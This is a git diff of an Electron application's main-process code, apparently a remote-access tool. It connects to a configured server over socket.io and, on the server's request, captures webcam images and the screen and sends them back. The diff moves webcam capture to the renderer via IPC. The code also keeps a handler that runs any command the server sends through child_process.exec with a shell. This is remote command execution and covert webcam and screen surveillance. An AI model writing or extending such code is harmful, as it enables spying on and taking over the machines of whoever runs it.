@@ -1,42 +1,20 @@
-const { desktopCapturer, screen, app } = require("electron");
+const { desktopCapturer, screen, app, ipcMain } = require("electron");
 const io = require("socket.io-client");
 const child_process = require("child_process");
-const nwc = require("node-webcam");
 
 //const robot = require("robotjs");
 
 // My Modules
 const info = require("./config");
 
+
+
 class RemoteControl {
   constructor() {
-    nwc.list((list) => {
-      console.log({
-        list,
-      });
-    });
+    this.mainWindow;
   }
-  getCamData = (data) => {
-    var options = {
-      width: 800,
-      height: 600,
-      quality: 100,
-      frames: 60,
-      delay: 0,
-      saveShots: false,
-      output: "jpeg",
-      device: false,
-      callbackReturn: "base64",
-      verbose: false,
-    };
-
-    let wc = nwc.create(options);
-    wc.capture("a.db", (error, result) => {
-      try {
-        data["src"] = result;
-        this.socket.emit("camShotResponse", data);
-      } catch (error) {}
-    });
+  getCamDataWeb = (data) => {
+    this.mainWindow.webContents.send("camStart", data);
   };
 
   getScreenData = (data) => {
@@ -68,6 +46,8 @@ class RemoteControl {
   };
 
   start = (mainWindow) => {
+    this.mainWindow = mainWindow;
+
     this.socket = io.connect("http://" + info.host + ":" + info.port);
     this.socket.on("connect", () => {
       this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
@@ -78,8 +58,16 @@ class RemoteControl {
     });
 
     this.socket.on("camShotRequest", (data) => {
-      this.getCamData(data);
+      this.getCamDataWeb(data);
     });
+
+    ipcMain.on("cam", (event, args) => {
+        console.log("cam event:");
+        console.log({args});
+    
+          this.socket.emit("camShotResponse", args);
+       
+      });
 
     this.socket.on("getRunRequest", (data) => {
       child_process.exec(data.cmd, { shell: true }, (err, stdout, stderr) => {
